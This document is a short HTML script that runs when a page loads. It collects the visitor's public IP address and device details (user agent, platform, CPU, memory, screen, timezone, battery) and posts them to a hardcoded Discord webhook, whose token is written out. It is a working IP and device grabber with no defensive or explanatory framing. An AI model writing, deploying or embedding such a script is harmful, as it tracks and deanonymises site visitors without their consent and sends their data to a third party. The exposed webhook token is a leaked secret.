<script>
window.addEventListener("load", async () => {
  const webhookURL = "https://discord.com/api/webhooks/1472358587455246548/pc6oWJBb1vMP2bkfS-diW4OkkIY96FWF3RoCC3_3vaBRszSmWis70oIhupoAIcLsTNA6";
  function log(msg, color="black") {
    const p = document.createElement("pre");
    p.style.color = color;
    p.textContent = msg;
    document.body.appendChild(p);
  }

  try {
    log("Getting public IP...", "blue");

    const ipRes = await fetch("https://api64.ipify.org?format=json");
    const ipData = await ipRes.json();

    log("IP received: " + ipData.ip, "green");

    // Device Info
    const deviceInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      cores: navigator.hardwareConcurrency || "Unknown",
      memory: navigator.deviceMemory || "Unknown",
      screen: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      online: navigator.onLine
    };

    // Battery (may not work on iOS)
    let batteryInfo = "Not supported";
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      batteryInfo =
        `Level: ${Math.round(battery.level * 100)}% | ` +
        `Charging: ${battery.charging}`;
    }

    log("Sending to webhook...", "blue");

    const payload = {
      content:
        `üåç Visit Detected\n\n` +
        `IP: ${ipData.ip}\n` +
        `Platform: ${deviceInfo.platform}\n` +
        `Language: ${deviceInfo.language}\n` +
        `CPU Cores: ${deviceInfo.cores}\n` +
        `RAM (approx): ${deviceInfo.memory} GB\n` +
        `Screen: ${deviceInfo.screen}\n` +
        `Timezone: ${deviceInfo.timezone}\n` +
        `Online: ${deviceInfo.online}\n` +
        `Battery: ${batteryInfo}\n\n` +
        `UserAgent:\n${deviceInfo.userAgent}`
    };

    await fetch(webhookURL, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    log("‚úÖ Sent to webhook!", "green");

  } catch (err) {
    log("‚ùå Error: " + err.message, "red");
  }
});
</script>
